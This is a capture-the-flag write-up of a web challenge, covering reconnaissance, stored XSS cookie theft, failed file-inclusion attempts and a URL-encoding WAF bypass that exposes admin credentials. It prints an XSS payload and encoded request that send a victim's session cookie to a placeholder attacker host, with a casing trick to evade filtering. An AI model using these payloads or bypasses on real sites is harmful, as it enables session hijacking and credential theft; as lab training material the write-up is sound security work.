# CTF Write-Up — Web Exploitation Challenge

> **Difficulty:** Medium
> **Category:** Web / XSS / LFI / WAF Bypass
> **Flags captured:** 2/2

---

## Phase 1 — Reconnaissance

Starting with a classic Nmap service scan to enumerate open ports and grab service banners.

```bash
nmap -sV -sC 10.129.177.235
```

**Open ports:**

| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |

Nothing exotic — standard web attack surface. Moving on to directory and file fuzzing.

```bash
ffuf -u "http://10.129.177.235/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -H "User-Agent: Mozilla/5.0" \
     -e .php,.txt,.conf,.log
```

**Interesting discoveries:**

| Path | Status |
|------|--------|
| `/config/app.conf` | Blocked by WAF |
| `/logs/error.log` | Accessible |
| `/status.php` | Accessible |
| `/live.php?page=match.php` | Potential LFI vector |
| `/register.php` | User registration |
| `/login.php` | Login page |

---

## Phase 2 — XSS Cookie Hijacking → Moderator Session

The application has a Moderator account that auto-crawls user content. Nmap revealed that the session cookie has `HttpOnly: false`, which means JavaScript can read it — making it a viable XSS cookie-theft target.

**Step 1 — Start a listener to catch the incoming cookie:**

```bash
python3 -m http.server
# Serving HTTP on 0.0.0.0 port 8000
```

**Step 2 — Craft the XSS payload.**

The WAF filters the word `cookie`, so we bypass it with a casing trick (`cookiE`):

```html
<body onload="new Image().src='http://<ATTACKER_IP>:8000?c='+document['cookiE'];">
```

**Step 3 — Inject via `/register.php`.**

Using Burp Suite Repeater, we URL-encode the payload and submit it as the username field:

```http
POST /register.php HTTP/1.1
Host: <TARGET_IP>
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=i8cr9vdl1sq6v23qh68s0o7m6o

username=%3cbody%20onload%3d%22new%20Image().src%3d'http%3a%2f%2f<ATTACKER_IP>%3a8000%3fc%3d'%2bdocument%5b'cookiE'%5d%3b%22%3e&password=abc&level=amateur&game_type=single
```

**Step 4 — Receive the cookie.**

When the Moderator's crawler visits our profile, it fires the payload and we receive the session cookie on our listener:

```
aomjk2e8tg5voft9pqu2i9pprb
```

**Step 5 — Hijack the session.**

Navigate to `/login.php`, open DevTools, and replace our `PHPSESSID` with the stolen cookie. Refresh — we're in as Moderator.

> 🚩 **Flag 1:** `THM{Logged_1n_Moderat0r}`

---

## Phase 3 — Exploring Further (Dead Ends)

With Moderator access, a few avenues were explored:

**Account Takeover attempt:** Created multiple accounts with username variations (`admin`, `aDmiN`, etc.) and approved them through the Moderator panel. No privilege escalation achieved.

**LFI at `/live.php?page=match.php`:** The parameter was confirmed to be user-controlled and potentially vulnerable to Local File Inclusion. Despite extensive testing (path traversal, PHP wrappers, null bytes, encoding variations), no working LFI payload was found and no path to RCE was identified.

---

## Phase 4 — WAF Bypass → Admin Credentials Leak

Recall from recon that `/config/app.conf` was blocked by the WAF. The WAF likely matches on the raw string `/config/app.conf` in the request path.

**Bypass:** URL-encode the path so the WAF fails to pattern-match it, while the backend still resolves it correctly.

```
/config/%61pp%2e%63onf
# or simply
/%63onfig/app.conf
```

Requesting the encoded path returns the file contents, which include leaked admin credentials.

Using those credentials to log in at `/login.php` as admin:

> 🚩 **Flag 2:** `THM{Logged_1n_Adm1n001}`

---

## Summary

| Step | Technique | Result |
|------|-----------|--------|
| Port scan | Nmap `-sV -sC` | SSH + HTTP found |
| Dir bruteforce | ffuf | Several interesting endpoints |
| Cookie theft | Stored XSS + `HttpOnly: false` | Moderator session hijacked |
| Privilege escalation | Account takeover | ❌ Failed |
| LFI | Path traversal / PHP wrappers | ❌ Failed |
| Credential leak | WAF bypass via URL encoding | Admin access gained |

---

## Key Takeaways

- **`HttpOnly: false` is critical** — always check cookie flags early; it's the difference between a stored XSS being a nuisance and a full session hijack.
- **WAF string matching is fragile** — simple URL encoding or casing tricks can bypass naive pattern-based rules. Defense should normalise paths before matching.
- **LFI without RCE** is a reminder that not every vulnerability chain completes. Knowing when to pivot is part of the methodology.
- **Config files in web roots** are a classic mistake. `/config/app.conf` should never be reachable from the browser, WAF-blocked or not.
